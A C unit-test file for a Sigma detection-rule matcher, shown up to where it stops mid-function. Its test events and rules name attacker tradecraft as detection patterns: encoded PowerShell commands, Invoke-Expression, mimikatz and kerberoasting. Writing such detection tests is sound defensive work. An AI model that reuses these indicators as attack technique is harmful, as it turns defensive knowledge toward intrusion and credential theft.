/* test_sigma_match.c
 * Standalone unit tests for the libsigma matcher core (sigma_match.c) and the
 * artifact serializer/loader (sigma_format.c).  No third-party dependency
 * beyond PCRE2, pure libc otherwise, runs anywhere.
 *
 * Build: clang -std=c11 -O2 -Wall -Wextra test_sigma_match.c sigma_match.c \
 *              sigma_format.c -o test_sigma
 *
 * Copyright 2026 Advens.
 * Author: Jeremie Jourdin <jeremie.jourdin@advens.fr>
 *
 * This file is part of libsigma.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *       -or-
 *       see LICENSE in the source distribution
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "sigma_match.h"
#include "sigma_format.h"
#include "sigma_simd.h" /* sigma_crc32c (wrong-version test flips a serialized artifact) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <stdbool.h>
#include <time.h> /* clock(), for the |re match-limit bound test */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* ===========================================================================
 * Micro test-builder: assembles a sigma_db_t in memory (the real binary
 * compiler is separate; this exercises the matcher + format).
 * Builder-owned arrays => sigma_db_free frees each individually.
 * ========================================================================= */
#define CAP 512

typedef struct {
    sigma_db_t db;
    char pool[8192];
    uint32_t pool_len;
    sigma_str_t fields[CAP];
    sigma_pred_t preds[CAP];
    sigma_str_t values[CAP];
    sigma_sel_t sels[CAP];
    sigma_ctok_t cond[CAP];
    sigma_rule_t rules[CAP];
    sigma_cidr_t cidrs[CAP];
    sigma_str_t bucket_keys[CAP];
    sigma_bucket_t buckets[CAP];
    uint32_t bucket_idx[CAP];
    sigma_str_t litndl[CAP];
    sigma_litpost_t litpost[CAP];
    sigma_litref_t litpost_ref[CAP];
    uint32_t litav[CAP];
    uint8_t rule_clauses[CAP];
    sigma_fwit_t fwit[CAP];
} tb_t;

static uint32_t tb_intern(tb_t* t, const char* s) {
    uint32_t len = (uint32_t)strlen(s);
    assert(t->pool_len + len <= sizeof(t->pool));
    uint32_t off = t->pool_len;
    memcpy(t->pool + off, s, len);
    t->pool_len += len;
    return off;
}

/* Intern a field NAME with a trailing NUL (the .sigmac contract): the byte at
 * strpool[off + len] is '\0' so the matcher can pass the strpool pointer
 * straight to the zero-copy C-string field lookup.  len excludes the NUL. */
static uint32_t tb_intern_cstr(tb_t* t, const char* s) {
    uint32_t len = (uint32_t)strlen(s);
    assert(t->pool_len + len + 1u <= sizeof(t->pool));
    uint32_t off = t->pool_len;
    memcpy(t->pool + off, s, len);
    t->pool[off + len] = '\0';
    t->pool_len += len + 1u;
    return off;
}

static uint16_t tb_field(tb_t* t, const char* name) {
    uint32_t nlen = (uint32_t)strlen(name);
    for (uint32_t i = 0; i < t->db.n_fields; i++) /* dedup => stable field_id */
        if (t->fields[i].len == nlen && memcmp(t->pool + t->fields[i].off, name, nlen) == 0) return (uint16_t)i;
    uint32_t off = tb_intern_cstr(t, name);
    t->fields[t->db.n_fields] = (sigma_str_t){off, nlen};
    return (uint16_t)t->db.n_fields++;
}

static uint32_t tb_value(tb_t* t, const char* v) {
    uint32_t off = tb_intern(t, v);
    t->values[t->db.n_values] = (sigma_str_t){off, (uint32_t)strlen(v)};
    return t->db.n_values++;
}

static void tb_pred_str(tb_t* t, const char* field, uint8_t op, const char* val, uint16_t group, uint8_t flags) {
    t->preds[t->db.n_preds++] = (sigma_pred_t){.field_id = tb_field(t, field),
                                               .group_id = group,
                                               .op = op,
                                               .flags = flags,
                                               .value_id = (val ? tb_value(t, val) : SIGMA_NO_VALUE),
                                               .ival = 0};
}

static void tb_pred_num(tb_t* t, const char* field, uint8_t op, int64_t iv, uint16_t group) {
    t->preds[t->db.n_preds++] = (sigma_pred_t){.field_id = tb_field(t, field),
                                               .group_id = group,
                                               .op = op,
                                               .flags = 0,
                                               .value_id = SIGMA_NO_VALUE,
                                               .ival = iv};
}

/* |fieldref: the operand is another FIELD's value. value_id holds the referenced
 * field's index (into the fields table); SIGMA_PF_FIELDREF tells the matcher so. */
static void tb_pred_fieldref(
    tb_t* t, const char* field, uint8_t op, const char* reffield, uint16_t group, uint8_t flags) {
    uint16_t ref = tb_field(t, reffield);
    t->preds[t->db.n_preds++] = (sigma_pred_t){.field_id = tb_field(t, field),
                                               .group_id = group,
                                               .op = op,
                                               .flags = (uint8_t)(flags | SIGMA_PF_FIELDREF),
                                               .value_id = ref,
                                               .ival = 0};
}

/* Parse "net/prefix" (v4 or v6), mask the network, append to the cidr table. */
static uint32_t tb_cidr(tb_t* t, const char* cidr) {
    char tmp[64];
    assert(strlen(cidr) < sizeof(tmp));
    strcpy(tmp, cidr);
    char* slash = strchr(tmp, '/');
    assert(slash);
    *slash = '\0';
    int prefix = atoi(slash + 1);

    sigma_cidr_t c;
    memset(&c, 0, sizeof(c));
    struct in6_addr a6;
    struct in_addr a4;
    if (inet_pton(AF_INET, tmp, &a4) == 1) {
        c.family = 4;
        c.prefix = (uint8_t)prefix;
        memcpy(c.net, &a4, 4);
    } else if (inet_pton(AF_INET6, tmp, &a6) == 1) {
        c.family = 6;
        c.prefix = (uint8_t)prefix;
        memcpy(c.net, &a6, 16);
    } else {
        assert(0 && "bad cidr literal");
    }
    /* Mask the stored network so it is canonical (matcher assumes pre-masked). */
    unsigned nbytes = (c.family == 4) ? 4u : 16u;
    for (unsigned i = 0; i < nbytes; i++) {
        unsigned bit = i * 8u;
        if (bit + 8u <= c.prefix) continue;
        if (bit >= c.prefix) {
            c.net[i] = 0;
            continue;
        }
        c.net[i] &= (uint8_t)(0xFFu << (8u - (c.prefix - bit)));
    }
    t->cidrs[t->db.n_cidrs] = c;
    return t->db.n_cidrs++;
}

static void tb_pred_cidr(tb_t* t, const char* field, uint32_t cidr_id, uint16_t group) {
    t->preds[t->db.n_preds++] = (sigma_pred_t){.field_id = tb_field(t, field),
                                               .group_id = group,
                                               .op = SIGMA_OP_CIDR,
                                               .flags = 0,
                                               .value_id = cidr_id,
                                               .ival = 0};
}

static uint32_t tb_sel(tb_t* t, uint32_t pred_start) {
    t->sels[t->db.n_sels] = (sigma_sel_t){pred_start, t->db.n_preds - pred_start};
    return t->db.n_sels++;
}

static uint32_t tb_rule(tb_t* t,
                        uint32_t rule_id,
                        uint32_t sel_start,
                        uint32_t sel_count,
                        uint32_t cond_start,
                        uint32_t cond_count,
                        uint8_t verdict,
                        uint8_t sev,
                        uint16_t score) {
    t->rules[t->db.n_rules] = (sigma_rule_t){.rule_id = rule_id,
                                             .sel_start = sel_start,
                                             .sel_count = sel_count,
                                             .cond_start = cond_start,
                                             .cond_count = cond_count,
                                             .verdict = verdict,
                                             .severity = sev,
                                             .score_x100 = score,
                                             .name_id = SIGMA_NO_VALUE,
                                             .mitre_id = SIGMA_NO_VALUE};
    return t->db.n_rules++;
}

/* Same, with a primary MITRE technique interned into the .values strpool. */
static uint32_t tb_rule_mitre(tb_t* t,
                              uint32_t rule_id,
                              uint32_t sel_start,
                              uint32_t sel_count,
                              uint8_t verdict,
                              uint8_t sev,
                              uint16_t score,
                              const char* mitre) {
    t->rules[t->db.n_rules] = (sigma_rule_t){.rule_id = rule_id,
                                             .sel_start = sel_start,
                                             .sel_count = sel_count,
                                             .cond_start = 0,
                                             .cond_count = 0,
                                             .verdict = verdict,
                                             .severity = sev,
                                             .score_x100 = score,
                                             .name_id = SIGMA_NO_VALUE,
                                             .mitre_id = tb_value(t, mitre)};
    return t->db.n_rules++;
}

/* Add a bucket: intern `key` (use "" for always-verify) and append a
 * slice of rule indices.  `ids`/`n` are rule INDICES into t->rules. */
static void tb_bucket(tb_t* t, const char* key, const uint32_t* ids, uint32_t n) {
    uint32_t klen = (uint32_t)strlen(key);
    uint32_t koff = klen ? tb_intern(t, key) : t->pool_len; /* empty key: 0-len */
    uint32_t start = t->db.n_bucket_idx;
    for (uint32_t i = 0; i < n; i++) t->bucket_idx[t->db.n_bucket_idx++] = ids[i];
    t->bucket_keys[t->db.n_buckets] = (sigma_str_t){koff, klen};
    t->buckets[t->db.n_buckets] = (sigma_bucket_t){start, n};
    t->db.n_buckets++;
}

/* add a prefilter needle (case-folded) with its postings.  `refs`/`n` are
 * (rule index, field, clause) triples; the rule's clause count grows to cover
 * every clause index posted for it. */
static void tb_litrefs(tb_t* t, const char* needle, const sigma_litref_t* refs, uint32_t n) {
    uint32_t nlen = (uint32_t)strlen(needle);
    uint32_t noff = tb_intern(t, needle);
    uint32_t start = t->db.n_litpost_ref;
    for (uint32_t i = 0; i < n; i++) {
        t->litpost_ref[t->db.n_litpost_ref++] = refs[i];
        uint8_t want = (uint8_t)(refs[i].clause_idx + 1u);
        if (t->rule_clauses[refs[i].rule_idx] < want) t->rule_clauses[refs[i].rule_idx] = want;
    }
    t->litndl[t->db.n_litndl] = (sigma_str_t){noff, nlen};
    t->litpost[t->db.n_litndl] = (sigma_litpost_t){start, n};
    t->db.n_litndl++;
}

/* single-clause, unscoped postings: the shape a needle had before the artifact
 * carried a field and a clause per posting. */
static void tb_litndl(tb_t* t, const char* needle, const uint32_t* ids, uint32_t n) {
    sigma_litref_t refs[16];
    assert(n <= 16);
    for (uint32_t i = 0; i < n; i++) refs[i] = (sigma_litref_t){ids[i], SIGMA_LITREF_ANY_FIELD, 0, 0};
    tb_litrefs(t, needle, refs, n);
}

static void tb_litav(tb_t* t, const uint32_t* ids, uint32_t n) {
    for (uint32_t i = 0; i < n; i++) t->litav[t->db.n_litav++] = ids[i];
}

static void tb_fwit(tb_t* t, uint32_t rule_idx, uint16_t field_id, uint8_t clause, uint8_t op, int64_t ival) {
    t->fwit[t->db.n_fwit++] =
        (sigma_fwit_t){.rule_idx = rule_idx, .field_id = field_id, .clause_idx = clause, .op = op, .ival = ival};
    uint8_t want = (uint8_t)(clause + 1u);
    if (t->rule_clauses[rule_idx] < want) t->rule_clauses[rule_idx] = want;
}

static sigma_db_t tb_finish(tb_t* t) {
    sigma_db_t d = t->db;
#define DUP(field, n, type)                                \
    do {                                                   \
        if (n) {                                           \
            d.field = malloc((n) * sizeof(type));          \
            assert(d.field);                               \
            memcpy(d.field, t->field, (n) * sizeof(type)); \
        } else                                             \
            d.field = NULL;                                \
    } while (0)
    DUP(fields, d.n_fields, sigma_str_t);
    DUP(values, d.n_values, sigma_str_t);
    DUP(preds, d.n_preds, sigma_pred_t);
    DUP(sels, d.n_sels, sigma_sel_t);
    DUP(cond, d.n_cond, sigma_ctok_t);
    DUP(rules, d.n_rules, sigma_rule_t);
    DUP(cidrs, d.n_cidrs, sigma_cidr_t);
    DUP(bucket_keys, d.n_buckets, sigma_str_t);
    DUP(buckets, d.n_buckets, sigma_bucket_t);
    DUP(bucket_idx, d.n_bucket_idx, uint32_t);
    DUP(litndl, d.n_litndl, sigma_str_t);
    DUP(litpost, d.n_litndl, sigma_litpost_t);
    DUP(litpost_ref, d.n_litpost_ref, sigma_litref_t);
    DUP(litav, d.n_litav, uint32_t);
    DUP(rule_clauses, d.n_rules, uint8_t);
    DUP(fwit, d.n_fwit, sigma_fwit_t);
#undef DUP
    d.strpool = malloc(t->pool_len ? t->pool_len : 1);
    assert(d.strpool);
    memcpy(d.strpool, t->pool, t->pool_len);
    d.strpool_len = t->pool_len;
    d.av_bucket = UINT32_MAX;
    d.cat_field_id = UINT32_MAX;
    d.backing = NULL;
    return d;
}

/* ===========================================================================
 * Event model: a flat key/value map + matching field callback.
 * ========================================================================= */
typedef struct {
    const char* k;
    const char* v;
} kv_t;
typedef struct {
    const kv_t* kv;
    int n;
} event_t;

static const char* ev_lookup(void* ctx, const char* name, uint32_t name_len, size_t* out_len) {
    const event_t* e = (const event_t*)ctx;
    for (int i = 0; i < e->n; i++) {
        if (strlen(e->kv[i].k) == name_len && memcmp(e->kv[i].k, name, name_len) == 0) {
            *out_len = strlen(e->kv[i].v);
            return e->kv[i].v;
        }
    }
    *out_len = 0;
    return NULL;
}

static int g_pass = 0, g_fail = 0;
#define CHECK(cond, msg)                 \
    do {                                 \
        if (cond) {                      \
            g_pass++;                    \
        } else {                         \
            g_fail++;                    \
            printf("  FAIL: %s\n", msg); \
        }                                \
    } while (0)

static bool fires(sigma_eval_t* ev, const event_t* e, uint32_t rule_id, uint8_t* verdict_out) {
    sigma_hit_t hits[32];
    int n = sigma_eval_run(ev, ev_lookup, (void*)e, hits, 32);
    for (int i = 0; i < n; i++)
        if (hits[i].rule_id == rule_id) {
            if (verdict_out) *verdict_out = hits[i].verdict;
            return true;
        }
    return false;
}

/* The assertion battery, run against both the in-memory db and the db
 * reloaded from its serialized artifact (must be byte-for-byte equivalent). */
static void run_battery(const sigma_db_t* db, const char* tag) {
    sigma_eval_t* ev = sigma_eval_create(db);
    assert(ev);

    /* R100: image|endswith ".exe"(ci) AND cmdline|contains "-enc" */
    {
        kv_t kv[] = {{"process.image", "C:\\...\\PowerShell.exe"},
                     {"process.command_line", "powershell -EncodedCommand ZQBjAGgA"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 100, NULL), "R100 ci-endswith + contains should fire");
    }
    {
        kv_t kv[] = {{"process.image", "/usr/bin/powershell.exe"},
                     {"process.command_line", "powershell -File foo.ps1"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 100, NULL), "R100 must NOT fire without -enc");
    }

    /* R200: source.ip in [10.0.0.5, 10.0.0.6] (group-OR) AND outcome==failure */
    {
        kv_t kv[] = {{"source.ip", "10.0.0.6"}, {"event.outcome", "failure"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 200, NULL), "R200 OR-list 2nd value + failure should fire");
    }
    {
        kv_t kv[] = {{"source.ip", "10.0.0.9"}, {"event.outcome", "failure"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 200, NULL), "R200 must NOT fire for ip outside OR-list");
    }
    {
        kv_t kv[] = {{"source.ip", "10.0.0.5"}, {"event.outcome", "success"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 200, NULL), "R200 must NOT fire when outcome!=failure (AND group)");
    }

    /* R300: destination.port|gte 1024 AND transport==tcp */
    {
        kv_t kv[] = {{"destination.port", "8443"}, {"network.transport", "tcp"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 300, NULL), "R300 port>=1024 && tcp should fire");
    }
    {
        kv_t kv[] = {{"destination.port", "443"}, {"network.transport", "tcp"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 300, NULL), "R300 must NOT fire for port 443");
    }

    /* R400: selA AND NOT selB  (RPN) */
    {
        kv_t kv[] = {{"event.action", "login"}, {"source.ip", "8.8.8.8"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 400, NULL), "R400 login from non-loopback should fire");
    }
    {
        kv_t kv[] = {{"event.action", "login"}, {"source.ip", "127.0.0.1"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 400, NULL), "R400 must NOT fire for loopback login (NOT selB)");
    }

    /* R500: user.name|exists AND action==delete => ESCALATE */
    {
        kv_t kv[] = {{"user.name", "alice"}, {"event.action", "delete"}};
        event_t e = {kv, 2};
        uint8_t v = 255;
        CHECK(fires(ev, &e, 500, &v), "R500 user exists + delete should fire");
        CHECK(v == SIGMA_VERDICT_ESCALATE, "R500 verdict must be ESCALATE");
    }
    {
        kv_t kv[] = {{"event.action", "delete"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 500, NULL), "R500 must NOT fire when user.name absent");
    }

    /* R600: IPv4 CIDR 10.0.0.0/8 */
    {
        kv_t kv[] = {{"source.ip", "10.5.6.7"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 600, NULL), "R600 10.5.6.7 in 10.0.0.0/8 should fire");
    }
    {
        kv_t kv[] = {{"source.ip", "192.168.1.1"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 600, NULL), "R600 192.168.1.1 not in 10.0.0.0/8");
    }
    {
        kv_t kv[] = {{"source.ip", "not-an-ip"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 600, NULL), "R600 non-IP value must not match CIDR");
    }

    /* R601: IPv6 CIDR 2001:db8::/32 */
    {
        kv_t kv[] = {{"source.ip", "2001:db8:dead:beef::1"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 601, NULL), "R601 v6 in 2001:db8::/32 should fire");
    }
    {
        kv_t kv[] = {{"source.ip", "2001:dead::1"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 601, NULL), "R601 v6 outside 2001:db8::/32");
    }

    /* R700: regex |re Invoke-[A-Za-z]+ (case-insensitive) */
    {
        kv_t kv[] = {{"process.command_line", "powershell IEX (Invoke-Expression)"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 700, NULL), "R700 regex should fire on Invoke-Expression");
    }
    {
        kv_t kv[] = {{"process.command_line", "powershell -File run.ps1"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 700, NULL), "R700 regex must not fire without Invoke-");
    }

    /* R701: PCRE dialect (\d), POSIX ERE could not compile this, so it proves
     * the PCRE2 backend is live, not the old regcomp path. */
    {
        kv_t kv[] = {{"process.command_line", "connect to port 443 now"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 701, NULL), "R701 PCRE \\d{3,} fires on 'port 443'");
    }
    {
        kv_t kv[] = {{"process.command_line", "connect to port 80 now"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 701, NULL), "R701 PCRE \\d{3,} no fire on 2-digit port");
    }
    {
        kv_t kv[] = {{"process.command_line", "no port number here"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 701, NULL), "R701 PCRE \\d{3,} no fire without digits");
    }

    /* R800: a matched rule with a technique surfaces it in the hit. */
    {
        kv_t kv[] = {{"event.action", "kerberoast"}};
        event_t e = {kv, 1};
        sigma_hit_t hits[32];
        int n = sigma_eval_run(ev, ev_lookup, (void*)&e, hits, 32);
        const sigma_hit_t* h = NULL;
        for (int i = 0; i < n; i++)
            if (hits[i].rule_id == 800) h = &hits[i];
        CHECK(h != NULL, "R800 should fire");
        CHECK(h && h->mitre != NULL && h->mitre_len == 9 && memcmp(h->mitre, "T1558.003", 9) == 0,
              "R800 hit must carry technique T1558.003");
    }

    /* A rule with no technique surfaces a NULL mitre (no bogus emit). */
    {
        kv_t kv[] = {{"source.ip", "10.5.6.7"}};
        event_t e = {kv, 1};
        sigma_hit_t hits[32];
        int n = sigma_eval_run(ev, ev_lookup, (void*)&e, hits, 32);
        const sigma_hit_t* h = NULL;
        for (int i = 0; i < n; i++)
            if (hits[i].rule_id == 600) h = &hits[i];
        CHECK(h != NULL, "R600 should fire (mitre-less control)");
        CHECK(h && h->mitre == NULL && h->mitre_len == 0, "R600 (no technique) must surface NULL mitre");
    }

    /* Per-hit reshape: the matcher emits per-rule labels only and must NOT
     * collapse the hits into a single top-level verdict/score; a downstream
     * stage owns that authority.  Here we verify the matcher surfaces every
     * per-rule field a consumer reads (verdict, severity, score hint =
     * score_x100, and the optional MITRE technique), and that it performs NO
     * cross-rule aggregation (no max-verdict / max-score). */
    {
        kv_t kv[] = {{"user.name", "alice"}, {"event.action", "delete"}};
        event_t e = {kv, 2};
        sigma_hit_t hits[32];
        int n = sigma_eval_run(ev, ev_lookup, (void*)&e, hits, 32);
        const sigma_hit_t* h = NULL;
        for (int i = 0; i < n; i++)
            if (hits[i].rule_id == 500) h = &hits[i];
        CHECK(h != NULL, "reshape: R500 escalate rule present in hits");
        /* Per-rule LABEL fields the warm path reads, verbatim from the baked
         * rule, no hot-path mutation. */
        CHECK(h && h->verdict == SIGMA_VERDICT_ESCALATE,
              "reshape: per-rule verdict is the baked verdict (no collapse)");
        CHECK(h && h->severity == 4, "reshape: per-rule severity is the baked severity");
        CHECK(h && h->score_x100 == 50, "reshape: per-rule score is the baked score_x100 HINT (==50)");
    }

    /* R900: |startswith */
    {
        kv_t kv[] = {{"process.command_line", "powershell -enc ZQBjAGgA"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 900, NULL), "R900 startswith 'powershell' should fire");
    }
    {
        kv_t kv[] = {{"process.command_line", "run powershell now"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 900, NULL), "R900 startswith must not fire mid-string");
    }

    /* R901: |lt 1024 */
    {
        kv_t kv[] = {{"destination.port", "80"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 901, NULL), "R901 lt: 80 < 1024 should fire");
    }
    {
        kv_t kv[] = {{"destination.port", "8443"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 901, NULL), "R901 lt: 8443 not < 1024");
    }

    /* R902: |lte 443 (boundary at the threshold) */
    {
        kv_t kv[] = {{"destination.port", "443"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 902, NULL), "R902 lte: 443 <= 443 should fire (boundary)");
    }
    {
        kv_t kv[] = {{"destination.port", "444"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 902, NULL), "R902 lte: 444 not <= 443");
    }

    /* R903: case-sensitive equality (SIGMA_PF_CASE) */
    {
        kv_t kv[] = {{"process.name", "MiMiKatz"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 903, NULL), "R903 case-sensitive: exact 'MiMiKatz' fires");
    }
    {
        kv_t kv[] = {{"process.name", "mimikatz"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 903, NULL), "R903 case-sensitive: 'mimikatz' must NOT fire");
    }

    /* R904: per-predicate NEGATE on a value op (field|not value) */
    {
        kv_t kv[] = {{"process.name", "powershell.exe"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 904, NULL), "R904 |not: present-and-different fires");
    }
    {
        kv_t kv[] = {{"process.name", "cmd.exe"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 904, NULL), "R904 |not: present-and-equal must NOT fire");
    }

    /* R905: field:null idiom (|exists negated) */
    {
        kv_t kv[] = {{"event.action", "logon"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 905, NULL), "R905 field:null: logon with no user.name fires");
    }
    {
        kv_t kv[] = {{"event.action", "logon"}, {"user.name", "alice"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 905, NULL), "R905 field:null: user.name present must NOT fire");
    }

    /* R906: condition OR ("1 of them") */
    {
        kv_t kv[] = {{"event.action", "alpha"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 906, NULL), "R906 OR: 'alpha' selection fires");
    }
    {
        kv_t kv[] = {{"event.action", "bravo"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 906, NULL), "R906 OR: 'bravo' selection fires");
    }
    {
        kv_t kv[] = {{"event.action", "charlie"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 906, NULL), "R906 OR: neither selection => no fire");
    }

    /* R907: multi-selection implicit AND ("all of them") */
    {
        kv_t kv[] = {{"event.module", "sysmon"}, {"event.type", "start"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 907, NULL), "R907 implicit-AND: both selections => fire");
    }
    {
        kv_t kv[] = {{"event.module", "sysmon"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 907, NULL), "R907 implicit-AND: only one selection => no fire");
    }
    {
        kv_t kv[] = {{"event.module", "other"}, {"event.type", "start"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 907, NULL), "R907 implicit-AND: other selection fails => no fire");
    }

    /* R908: case-sensitive regex (SIGMA_PF_CASE on |re) */
    {
        kv_t kv[] = {{"process.command_line", "run Invoke-Expression now"}};
        event_t e = {kv, 1};
        CHECK(fires(ev, &e, 908, NULL), "R908 case-sensitive re fires on exact-case 'Invoke-Expression'");
    }
    {
        kv_t kv[] = {{"process.command_line", "run invoke-expression now"}};
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 908, NULL), "R908 case-sensitive re must NOT fire on lowercase");
    }

    /* R909: |fieldref equality (field-to-field compare) */
    {
        kv_t kv[] = {{"user.name", "alice"}, {"user.target_name", "alice"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 909, NULL), "R909 fieldref: equal field values fire");
    }
    {
        kv_t kv[] = {{"user.name", "alice"}, {"user.target_name", "bob"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 909, NULL), "R909 fieldref: differing field values do not fire");
    }
    {
        kv_t kv[] = {{"user.name", "alice"}}; /* referenced field absent */
        event_t e = {kv, 1};
        CHECK(!fires(ev, &e, 909, NULL), "R909 fieldref: absent referenced field does not fire");
    }

    /* R910: |fieldref|contains (flag composes with the string ops) */
    {
        kv_t kv[] = {{"process.command_line", "C:\\x\\mimikatz.exe -a"}, {"process.name", "mimikatz.exe"}};
        event_t e = {kv, 2};
        CHECK(fires(ev, &e, 910, NULL), "R910 fieldref|contains: command_line contains process.name");
    }
    {
        kv_t kv[] = {{"process.command_line", "C:\\x\\notepad.exe"}, {"process.name", "mimikatz.exe"}};
        event_t e = {kv, 2};
        CHECK(!fires(ev, &e, 910, NULL), "R910 fieldref|contains: no substring => no fire");
    }

    sigma_eval_free(ev);
    (void)tag;
}

static void build_rules(tb_t* t) {
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.image", SIGMA_OP_ENDSWITH, "\\powershell.exe", 0, 0);
        tb_pred_str(t, "process.command_line", SIGMA_OP_CONTAINS, "-enc", 1, 0);
        tb_rule(t, 100, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 35);
    }

    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "source.ip", SIGMA_OP_EQ, "10.0.0.5", 0, 0);
        tb_pred_str(t, "source.ip", SIGMA_OP_EQ, "10.0.0.6", 0, 0);
        tb_pred_str(t, "event.outcome", SIGMA_OP_EQ, "failure", 1, 0);
        tb_rule(t, 200, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    {
        uint32_t ps = t->db.n_preds;
        tb_pred_num(t, "destination.port", SIGMA_OP_GTE, 1024, 0);
        tb_pred_str(t, "network.transport", SIGMA_OP_EQ, "tcp", 1, 0);
        tb_rule(t, 300, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 1, 10);
    }

    {
        uint32_t psA = t->db.n_preds;
        tb_pred_str(t, "event.action", SIGMA_OP_EQ, "login", 0, 0);
        uint32_t sA = tb_sel(t, psA);
        uint32_t psB = t->db.n_preds;
        tb_pred_str(t, "source.ip", SIGMA_OP_EQ, "127.0.0.1", 0, 0);
        uint32_t sB = tb_sel(t, psB);
        uint32_t c0 = t->db.n_cond;
        t->cond[t->db.n_cond++] = (sigma_ctok_t){SIGMA_C_SEL, {0, 0, 0}, 0};
        t->cond[t->db.n_cond++] = (sigma_ctok_t){SIGMA_C_SEL, {0, 0, 0}, 1};
        t->cond[t->db.n_cond++] = (sigma_ctok_t){SIGMA_C_NOT, {0, 0, 0}, 0};
        t->cond[t->db.n_cond++] = (sigma_ctok_t){SIGMA_C_AND, {0, 0, 0}, 0};
        tb_rule(t, 400, sA, (sB - sA) + 1, c0, t->db.n_cond - c0, SIGMA_VERDICT_ALERT, 2, 15);
    }

    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "user.name", SIGMA_OP_EXISTS, NULL, 0, 0);
        tb_pred_str(t, "event.action", SIGMA_OP_EQ, "delete", 1, 0);
        tb_rule(t, 500, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ESCALATE, 4, 50);
    }

    {
        uint32_t ps = t->db.n_preds; /* R600: source.ip|cidr 10.0.0.0/8 */
        tb_pred_cidr(t, "source.ip", tb_cidr(t, "10.0.0.0/8"), 0);
        tb_rule(t, 600, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    {
        uint32_t ps = t->db.n_preds; /* R601: source.ip|cidr 2001:db8::/32 */
        tb_pred_cidr(t, "source.ip", tb_cidr(t, "2001:db8::/32"), 0);
        tb_rule(t, 601, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    {
        uint32_t ps = t->db.n_preds; /* R700: command_line|re Invoke-[A-Za-z]+ */
        tb_pred_str(t, "process.command_line", SIGMA_OP_RE, "Invoke-[A-Za-z]+", 0, 0);
        tb_rule(t, 700, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
    }

    {
        uint32_t ps = t->db.n_preds; /* R701: PCRE-only \d (POSIX ERE lacks it) */
        tb_pred_str(t, "process.command_line", SIGMA_OP_RE, "port \\d{3,}", 0, 0);
        tb_rule(t, 701, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 3, 30);
    }

    /* R800: carries a primary MITRE technique, verify it round-trips
     * through serialize/load and is surfaced in the hit. */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "event.action", SIGMA_OP_EQ, "kerberoast", 0, 0);
        tb_rule_mitre(t, 800, tb_sel(t, ps), 1, SIGMA_VERDICT_ALERT, 3, 35, "T1558.003");
    }

    /* R900: |startswith (the op ships but had no test). */
    {
        uint32_t ps = t->db.n_preds;
        tb_pred_str(t, "process.command_line", SIGMA_OP_STARTSWITH, "powershell", 0, 0);
        tb_rule(t, 900, tb_sel(t, ps), 1, 0, 0, SIGMA_VERDICT_ALERT, 2, 20);
    }

    /* R901: |lt (numeric less-than; the op ships but had no test). */
    {
        uint32_t ps = t->db.n_preds;
